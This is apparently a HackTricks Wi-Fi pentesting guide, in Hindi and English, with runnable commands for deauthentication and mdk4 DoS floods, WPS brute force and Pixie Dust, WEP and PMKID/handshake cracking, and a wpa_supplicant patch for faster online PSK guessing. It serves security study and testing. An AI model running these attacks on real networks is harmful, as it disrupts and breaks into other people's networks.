# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi बेसिक कमांड्स
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## उपकरण

### Hijacker & NexMon (Android आंतरिक Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**docker के साथ airgeddon चलाएँ**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
स्रोत: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

यह Evil Twin, KARMA और Known Beacons attacks कर सकता है और फिर phishing template का उपयोग करके network का वास्तविक password प्राप्त करने या social network credentials को capture करने में सफल हो सकता है।
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

This tool automates **WPS/WEP/WPA-PSK** attacks. It will automatically:

- इंटरफ़ेस को monitor mode में सेट करता है
- संभावित नेटवर्क्स को स्कैन करता है - और आपको victim(s) चुनने देता है
- अगर WEP - WEP attacks लॉन्च करेगा
- यदि WPA-PSK
- यदि WPS: Pixie dust attack और bruteforce attack (सावधान रहें: brute-force attack में काफी समय लग सकता है)। ध्यान दें कि यह null PIN या database/generated PINs को आजमाता नहीं है।
- AP से PMKID capture करने की कोशिश करता है ताकि उसे crack किया जा सके
- हैण्डशेक capture करने के लिए AP के clients को deauthenticate करने की कोशिश करता है
- यदि PMKID या Handshake मिल जाए, तो top5000 passwords का उपयोग करके bruteforce करने की कोशिश करता है।

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- सभी को Disconnect करें (या किसी specific ESSID/Client को)
- Random fake APs -- नेट्स छुपाएँ, संभवतः scanners क्रैश कर सकते हैं
- Overload AP -- AP को बंद करने की कोशिश (अक्सर ज्यादा उपयोगी नहीं)
- WIDS -- IDS के साथ खेल
- TKIP, EAPOL -- कुछ विशिष्ट attacks कुछ APs को DoS करने के लिए
- **Cracking**
- Crack **WEP** (कई tools और methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds कैप्चर करने और/या LAN attacks करने के लिए उपयोगी
- **WPA-PSK** Evil Twin -- पासवर्ड जानने पर नेटवर्क attacks के लिए उपयोगी
- **WPA-MGT** -- कंपनी credentials कैप्चर करने के लिए उपयोगी
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds कैप्चर करने और/या LAN attacks करने के लिए उपयोगी
- **+ WPA** -- WPA handshakes कैप्चर करने के लिए उपयोगी

## Open / OWE networks quick notes

- **Passive capture** on open SSIDs अभी भी monitor mode और tcpdump के साथ काम करता है:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) per-station key exchange करता है (no PSK), इसलिए एयर फ्रेम्स "open" SSIDs पर भी encrypted होते हैं। WPA3-based होने के कारण यह **802.11w PMF** भी लागू करता है, जो spoofed deauth/disassoc frames को ब्लॉक करता है।
- OWE **does not authenticate** joiners: कोई भी associate कर सकता है, इसलिए marketing claims पर भरोसा करने की बजाय **verify client isolation** करें। Isolation न होने पर लोकल L2 पर ARP spoofing या responder-style poisoning अभी भी काम करता है।
- **Evil Twin** open/OWE SSIDs पर stronger signal दिखाकर अभी भी feasible है; PMF सिर्फ deauth shortcut को हटाता है। यदि victims एक forged TLS cert स्वीकार कर लेते हैं, तो पूरा HTTP(S) MitM फिर से मिल सकता है।
- open guest Wi-Fi पर broadcast poisoning आसानी से creds/hashes (LLMNR/NBT-NS/mDNS) दे देता है। See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**स्रोत** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, Wi-Fi hacking में एक प्रचलित तरीका हैं, जिनमें "management" frames को forge करके devices को **forcefully disconnect devices from a network** किया जाता है। ये unencrypted packets clients को यह भरोसा दिलाते हैं कि वे legitimate network से हैं, जिससे attackers WPA handshakes collect करके cracking के लिए उपयोग कर सकते हैं या लगातार network connections को बाधित कर सकते हैं। अपनी सादगी में यह tactic चिंताजनक है, व्यापक रूप से उपयोग होता है और network security पर इसका गंभीर प्रभाव हो सकता है।

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 का अर्थ है deauthentication
- 1 भेजने के लिए deauths की संख्या है (आप चाहें तो कई भेज सकते हैं); 0 का अर्थ है उन्हें लगातार भेजना
- -a 00:14:6C:7E:40:80 access point का MAC address है
- -c 00:0F:B5:34:30:30 उस क्लाइंट का MAC address है जिसे deauthenticate किया जाएगा; अगर यह छोड़ा गया है तो broadcast deauthentication भेजा जाता है (हमेशा काम नहीं करता)
- ath0 इंटरफ़ेस का नाम है

### Disassociation Packets

**Disassociation packets**, deauthentication packets की तरह, Wi‑Fi नेटवर्क में उपयोग होने वाले एक प्रकार के management frame होते हैं। ये पैकेट्स किसी डिवाइस (जैसे laptop या smartphone) और access point (AP) के बीच कनेक्शन को काटने का काम करते हैं। Disassociation और deauthentication के बीच मुख्य अंतर उनके उपयोग के परिदृश्यों में होता है। जबकि एक AP **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, restart, या relocate होने पर सामान्यतः भेजे जाते हैं, जिससे सभी connected nodes का डिसकनेक्शन आवश्यक हो जाता है।

**यह हमला mdk4(mode "d") द्वारा किया जा सकता है:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4 द्वारा अधिक DOS attacks**

**In** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

क्लाइंट्स पर नकली APs दिखाने के लिए beacon frames भेजता है। यह कभी-कभी network scanners और drivers को क्रैश कर सकता है!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

रेंज के भीतर सभी पहुँच योग्य Access Points (APs) को authentication frames भेजने से इन APs पर ओवरलोड हो सकता है, विशेषकर जब कई clients शामिल हों। यह तीव्र ट्रैफ़िक सिस्टम में अस्थिरता पैदा कर सकता है, जिससे कुछ APs जम सकते हैं या यहाँ तक कि reset भी हो सकते हैं।
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) जांचता है कि कोई SSID सही तरीके से प्रकट हो रहा है और AP की रेंज की पुष्टि करता है। यह तकनीक, **bruteforcing hidden SSIDs** को wordlist के साथ या बिना जोड़कर, छिपे हुए नेटवर्क की पहचान और उन तक पहुँच बनाने में मदद करती है।

**ATTACK MODE m: Michael Countermeasures Exploitation**

विभिन्न QoS queues को random या duplicate packets भेजने से **TKIP APs** पर Michael Countermeasures ट्रिगर हो सकते हैं, जिससे AP एक मिनट के लिए shutdown हो जाता है। यह तरीका एक प्रभावी **DoS** (Denial of Service) attack tactic है।
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

AP पर **EAPOL Start frames** से फ्लड करने पर **fake sessions** बनते हैं, जिससे AP ओवरवेल्म हो जाता है और वैध क्लाइंट्स ब्लॉक हो जाते हैं। वैकल्पिक रूप से, **fake EAPOL Logoff messages** इंजेक्ट करने से क्लाइंट्स जबरन डिस्कनेक्ट हो जाते हैं; दोनों तरीके प्रभावी रूप से नेटवर्क सेवा को बाधित करते हैं।
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attacks for IEEE 802.11s mesh networks**

मेश नेटवर्क में लिंक प्रबंधन और राउटिंग पर विभिन्न हमले।

**ATTACK MODE w: WIDS Confusion**

क्लाइंट्स को कई WDS nodes या fake rogue APs से क्रॉस-कनेक्ट करने से Intrusion Detection and Prevention Systems को मैनिपुलेट किया जा सकता है, जिससे भ्रम पैदा होता है और संभावित सिस्टम दुरुपयोग हो सकता है।
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

एक packet fuzzer जो विभिन्न packet स्रोतों और packet manipulation के लिए व्यापक modifiers का सेट प्रदान करता है।

### **Airggedon**

_**Airgeddon**_ पूर्व टिप्पणियों में प्रस्तावित अधिकांश attacks उपलब्ध कराता है:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) राउटर से डिवाइस कनेक्ट करने की प्रक्रिया को सरल बनाता है, और **WPA** या **WPA2** Personal से एन्क्रिप्टेड नेटवर्क्स के लिए सेटअप की गति और सहजता बढ़ाता है। यह आसानी से समझौता होने वाली **WEP** सुरक्षा के लिए प्रभावी नहीं है। WPS एक 8-digit PIN का उपयोग करता है, जिसे दो हिस्सों में सत्यापित किया जाता है, जिससे इसकी संभावनाओं की सीमित संख्या (11,000 संभावनाएँ) के कारण यह brute-force attacks के प्रति संवेदनशील हो जाता है।

### WPS Bruteforce

There are 2 main tools to perform this action: Reaver and Bully.

- **Reaver** को WPS के खिलाफ एक मजबूत और व्यावहारिक attack के रूप में डिज़ाइन किया गया है, और इसे विभिन्न access points और WPS implementations के खिलाफ टेस्ट किया गया है।
- **Bully** WPS brute force attack का **नया implementation** है, जो C में लिखा गया है। यह original reaver code की तुलना में कई फायदे देता है: कम dependencies, बेहतर memory और cpu performance, endianness का सही हैंडलिंग, और अधिक robust विकल्प।

यह attack **WPS PIN की vulnerability** का फायदा उठाता है, खासकर पहले चार अंकों के खुलासे और आखिरी अंक के checksum के रूप में होने के कारण, जिससे brute-force attack आसान हो जाता है। हालांकि, brute-force attacks के खिलाफ defenses, जैसे कि आक्रामक attackers के **blocking MAC addresses**, attack जारी रखने के लिए **MAC address rotation** की मांग करते हैं।

Bully या Reaver जैसे tools से WPS PIN प्राप्त करने पर, attacker WPA/WPA2 PSK का अनुमान लगा सकता है, जो **persistent network access** सुनिश्चित करता है।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

यह परिष्कृत तरीका ज्ञात कमजोरियों का उपयोग कर WPS PINs को निशाना बनाता है:

1. **Pre-discovered PINs**: एक ऐसे डेटाबेस का उपयोग करें जिसमें ज्ञात PINs शामिल हैं जो उन विशिष्ट निर्माताओं से जुड़े हैं जो समान WPS PINs का उपयोग करते हैं। यह डेटाबेस MAC-addresses के पहले तीन octets को इन निर्माताओं के संभावित PINs के साथ संबंधित करता है।
2. **PIN Generation Algorithms**: ComputePIN और EasyBox जैसे algorithms का उपयोग करें, जो AP के MAC-address के आधार पर WPS PINs की गणना करते हैं। Arcadyan algorithm अतिरिक्त रूप से एक device ID की आवश्यकता करता है, जो PIN generation प्रक्रिया में एक अतिरिक्त परत जोड़ता है।

### WPS Pixie Dust attack

**Dominique Bongard** ने कुछ Access Points (APs) में secret codes के निर्माण में एक flaw खोजी, जिन्हें **nonces** (**E-S1** और **E-S2**) कहा जाता है। यदि इन nonces का पता लगाया जा सके, तो AP के WPS PIN को क्रैक करना आसान हो जाता है। AP एक विशेष कोड (hash) के भीतर PIN प्रकट करता है ताकि यह साबित हो सके कि यह वैध है और कोई नकली (rogue) AP नहीं है। ये nonces मूल रूप से उस "कुंजी" हैं जो WPS PIN रखने वाली "सेफ" को अनलॉक करती हैं। More on this can be found [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

सरल शब्दों में, समस्या यह है कि कुछ APs ने कनेक्शन प्रक्रिया के दौरान PIN को encrypt करने के लिए पर्याप्त रैंडम keys का उपयोग नहीं किया। इससे PIN बाहरी नेटवर्क से अनुमान लगाने के लिए कमजोर हो जाता है (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
यदि आप डिवाइस को monitor mode में स्विच नहीं करना चाहते, या `reaver` और `bully` में कोई समस्या आ रही है, तो आप [OneShot-C](https://github.com/nikita-yfh/OneShot-C) आज़मा सकते हैं। यह टूल monitor mode में स्विच किए बिना Pixie Dust attack कर सकता है।
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

कुछ खराब डिज़ाइन किए गए सिस्टम यहां तक कि एक **Null PIN** (एक खाली या मौजूद न होने वाला PIN) को एक्सेस दे देते हैं, जो कि काफी असामान्य है। टूल **Reaver** इस vulnerability का परीक्षण कर सकता है, जबकि **Bully** ऐसा नहीं कर पाता।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 आपको **your custom PIN** आजमाने देते हैं (यदि आपके पास कोई है)
- 7 and 8 **Pixie Dust attack** को अंजाम देते हैं
- 13 आपको **NULL PIN** टेस्ट करने की अनुमति देता है
- 11 and 12 **चयनित AP से संबंधित PINs को उपलब्ध डेटाबेस से पुनः प्राप्त करेंगे** और **generate** संभावित **PINs** करेंगे using: ComputePIN, EasyBox and optionally Arcadyan (recommended, why not?)
- 9 and 10 **every possible PIN** का परीक्षण करेंगे

## **WEP**

क्यों यह कमजोर पड़ता है

- RC4 seed केवल **IV (24 bits) + shared key** है। IV cleartext है, छोटा (2^24), और जल्दी दोहराता है, इसलिए समान IV वाले ciphertexts keystream को reuse करते हैं।
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) आपको key bytes पर “vote” करने की अनुमति देते हैं। **PTW** ARP traffic का उपयोग करके इसे अनुकूलित करता है ताकि requirements लाखों की बजाय दसियों हज़ार packets तक घट जाएं।
- Integrity केवल **CRC32** (linear/unkeyed) है, इसलिए एक attacker बिट्स flip कर सकता है और key के बिना CRC32 पुनः गणना कर सकता है → packet forgery/replay/ARP injection जबकि IVs का इंतज़ार किया जा रहा है।

व्यावहारिक ब्रेक निश्चित है:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
यदि आप एक मार्गदर्शित UI पसंद करते हैं तो Airgeddon अभी भी एक "All-in-One" WEP workflow प्रदान करता है।

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018 में, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) एक नई attack method, जो इसलिए अनोखी है क्योंकि इसे केवल **one single packet** की आवश्यकता होती है और लक्ष्य AP से किसी clients के connected होने की ज़रूरत नहीं होती—सिर्फ attacker और AP के बीच interaction।

कई आधुनिक routers association के दौरान **optional field** को **first EAPOL** frame में जोड़ते हैं, जिसे `Robust Security Network` कहा जाता है। इसमें `PMKID` शामिल होता है।

जैसा कि मूल पोस्ट में बताया गया है, **PMKID** ज्ञात डेटा का उपयोग करके बनाया जाता है:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
यह मानते हुए कि "PMK Name" स्थिर है, AP और station का BSSID ज्ञात है, और `PMK` full 4-way handshake वाला ही है, **hashcat** इन जानकारियों का उपयोग करके PSK को crack कर passphrase recover कर सकता है!

इस जानकारी को **इकट्ठा** करने और पासवर्ड को स्थानीय रूप से **bruteforce** करने के लिए आप कर सकते हैं:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
ये **PMKIDs captured** **console** में दिखाई देंगे और साथ ही \_ **/tmp/attack.pcap**\_ में **saved** होंगे.\
अब कैप्चर को **hashcat/john** format में कन्वर्ट करके क्रैक करें:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
कृपया ध्यान दें कि एक सही hash का फॉर्मैट **4 भाग** जैसा होता है, जैसे: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`। यदि आपके पास **केवल** **3 भाग** हैं, तो वह **अमान्य** है (PMKID capture वैध नहीं था)।

ध्यान दें कि `hcxdumptool` **भी handshakes को capture करता है** (ऐसा कुछ दिखाई देगा: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**)। आप `cap2hccapx` का उपयोग करके इन **handshakes** को **hashcat**/**john** फॉर्मैट में रूपांतरित कर सकते हैं।
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_मैंने देखा है कि इस tool से capture किए गए कुछ handshakes सही password जानने के बावजूद cracked नहीं हो पाए। मैं सुझाव दूँगा कि यदि संभव हो तो पारंपरिक तरीके से भी handshakes capture करें, या इस tool का उपयोग करके कई handshakes capture करें।_

### Handshake capture

An attack on **WPA/WPA2** networks can be executed by capturing a **handshake** and attempting to **crack** the password **offline**. This process involves monitoring the communication of a specific network and **BSSID** on a particular **channel**. Here's a streamlined guide:

1. Identify the **BSSID**, **channel**, and a **connected client** of the target network.
2. Use `airodump-ng` to monitor the network traffic on the specified channel and BSSID, hoping to capture a handshake. The command will look like this:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake को capture करने की संभावना बढ़ाने के लिए, client को क्षणिक रूप से network से disconnect करें ताकि उसे re-authentication के लिए मजबूर किया जा सके। यह `aireplay-ng` कमांड का उपयोग करके किया जा सकता है, जो client को deauthentication packets भेजता है:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_ध्यान दें कि चूँकि क्लाइंट को deauthenticated किया गया था, यह किसी दूसरे AP से कनेक्ट करने की कोशिश कर सकता है या, कुछ मामलों में, किसी अलग नेटवर्क से कनेक्ट हो सकता है._

जब `airodump-ng` में कुछ handshake जानकारी दिखाई दे, तो इसका मतलब है कि handshake कैप्चर हो चुका है और आप सुनना बंद कर सकते हैं:

![](<../../images/image (172) (1).png>)

एक बार handshake कैप्चर हो जाने पर आप इसे `aircrack-ng` से **crack** कर सकते हैं:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### फ़ाइल में handshake है या नहीं जांचें

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_यदि यह टूल किसी ESSID का अधूरा handshake पूर्ण handshake से पहले पाता है, तो यह वैध वाले को पहचान नहीं पाएगा._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### तेज़ ऑनलाइन PSK अनुमान `wpa_supplicant` ctrl socket के माध्यम से (कोई clients/PMKID नहीं)

- जब कोई clients आसपास नहीं होते और AP PMKID से इनकार करता है, तो आप respawning supplicants किए बिना ऑनलाइन PSKs को क्रमिक रूप से आज़मा सकते हैं:
- `wpa_supplicant.c` को patch करें और auth failure backoff logic (around `ssid->auth_failures`) में `dur = 0;` ज़बरदस्ती सेट करें — इससे temporary-disable timer प्रभावी रूप से निष्क्रिय हो जाएगा।
- एक daemon को control socket के साथ चलाएँ:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- control interface के माध्यम से इसे drive करें, वही scan और network reuse करते हुए:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
एक छोटा Python लूप जो socket events (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) पढ़ता है, scan overhead के बिना लगभग 100 अनुमान ~5 मिनट में टेस्ट कर सकता है। यह फिर भी noisy और detectable है, लेकिन per-attempt process restarts और backoff delays से बचाता है।

## **WPA Enterprise (MGT)**

In **enterprise WiFi setups, you'll encounter various authentication methods**, प्रत्येक अलग-अलग सुरक्षा स्तर और management सुविधाएँ प्रदान करते हैं। जब आप `airodump-ng` जैसे tools का उपयोग network traffic की जांच के लिए करते हैं, तो आप इन authentication types के identifiers देख सकते हैं। कुछ सामान्य विधियाँ शामिल हैं:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- यह तरीका hardware tokens और one-time passwords को EAP-PEAP के भीतर सपोर्ट करता है। MSCHAPv2 के विपरीत, यह peer challenge का उपयोग नहीं करता और passwords को plaintext में access point को भेजता है, जिससे downgrade attacks का जोखिम पैदा होता है।
2. **EAP-MD5 (Message Digest 5)**:
- इसमें क्लाइंट से password का MD5 hash भेजना शामिल है। यह **अनुशंसित नहीं** है क्योंकि यह dictionary attacks के प्रति संवेदनशील है, server authentication का अभाव है, और session-specific WEP keys जनरेट करने में असमर्थ है।
3. **EAP-TLS (Transport Layer Security)**:
- यह authentication के लिए client-side और server-side दोनों certificates का उपयोग करता है और secure संचार के लिए user-based और session-based WEP keys को डायनामिक रूप से जनरेट कर सकता है।
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- यह एक encrypted tunnel के माध्यम से mutual authentication प्रदान करता है, साथ ही dynamic, per-user, per-session WEP keys निकालने का तरीका भी देता है। इसे केवल server-side certificates की आवश्यकता होती है, जबकि clients credentials का उपयोग करते हैं।
5. **PEAP (Protected Extensible Authentication Protocol)**:
- यह EAP की तरह काम करता है और सुरक्षित संचार के लिए एक TLS tunnel बनाता है। टनल द्वारा मिलने वाली सुरक्षा के कारण यह EAP के ऊपर कमजोर authentication protocols के उपयोग की अनुमति देता है।
- **PEAP-MSCHAPv2**: अक्सर इसे PEAP कहा जाता है; यह vulnerable MSCHAPv2 challenge/response mechanism को protective TLS tunnel के साथ जोड़ता है।
- **PEAP-EAP-TLS (or PEAP-TLS)**: यह EAP-TLS के समान है लेकिन certificates के आदान-प्रदान से पहले TLS tunnel शुरू करता है, जो अतिरिक्त सुरक्षा परत प्रदान करता है।

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) it looks like if you are using **EAP** the **"Identity"** **messages** must be **supported**, and the **username** is going to be sent in **clear** in the **"Response Identity"** messages.

Even using one of the most secure of authentication methods: **PEAP-EAP-TLS**, it is possible to **capture the username sent in the EAP protocol**. To do so, **capture a authentication communication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) and filter the packets by`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding is supported by both EAP-PEAP and EAP-TTLS. सामान्य रूप से, WiFi नेटवर्क के संदर्भ में, association process के दौरान access point (AP) द्वारा EAP-Identity request शुरू किया जाता है। उपयोगकर्ता की anonymity की सुरक्षा सुनिश्चित करने के लिए, उपयोगकर्ता के डिवाइस पर EAP client की response में केवल वही आवश्यक जानकारी रहती है जो initial RADIUS server को request प्रोसेस करने के लिए चाहिए। इसे निम्नलिखित परिदृश्यों के माध्यम से समझाया जा सकता है:

- EAP-Identity = anonymous
- इस परिदृश्य में, सभी users pseudonymous "anonymous" का उपयोग अपने user identifier के रूप में करते हैं। initial RADIUS server या तो EAP-PEAP या EAP-TTLS server के रूप में कार्य करता है, जो PEAP या TTLS प्रोटोकॉल के server-side को संभालता है। inner (protected) authentication method तब लोकली संभाला जाता है या remote (home) RADIUS server को delegated किया जाता है।
- EAP-Identity = anonymous@realm_x
- इस स्थिति में, अलग-अलग realms के users अपनी identities छुपाते हैं पर अपने संबंधित realms को सूचित करते हैं। यह initial RADIUS server को उनके home realms में स्थित RADIUS servers को EAP-PEAP या EAP-TTLS requests proxy करने की अनुमति देता है, जो PEAP या TTLS server का रूप लेते हैं। initial RADIUS server केवल एक RADIUS relay node के रूप में काम करता है।
- वैकल्पिक रूप से, initial RADIUS server EAP-PEAP या EAP-TTLS server के रूप में कार्य कर सकता है और protected authentication method को स्वयं संभाल सकता है या इसे किसी अन्य server को आगे भेज सकता है। यह विकल्प विभिन्न realms के लिए अलग नीतियों को कॉन्फ़िगर करने की सुविधा देता है।

EAP-PEAP में, एक बार TLS tunnel PEAP server और PEAP client के बीच स्थापित हो जाने पर, PEAP server एक EAP-Identity request आरंभ करता है और इसे TLS tunnel के माध्यम से भेजता है। client इस दूसरे EAP-Identity request का उत्तर देते समय encrypted tunnel के माध्यम से उपयोगकर्ता की वास्तविक identity भेजने वाले EAP-Identity response को भेजता है। यह तरीका 802.11 ट्रैफ़िक को सुनने वाले किसी भी व्यक्ति से उपयोगकर्ता की वास्तविक identity के प्रकट होने को प्रभावी ढंग से रोकता है।

EAP-TTLS थोड़ी अलग प्रक्रिया का पालन करता है। EAP-TTLS के साथ, client आम तौर पर PAP या CHAP का उपयोग करके authenticate करता है, जो TLS tunnel द्वारा सुरक्षित होता है। इस मामले में, client initial TLS message में User-Name attribute और या तो Password या CHAP-Password attribute शामिल करता है, जो tunnel स्थापित होने के बाद भेजा जाता है।

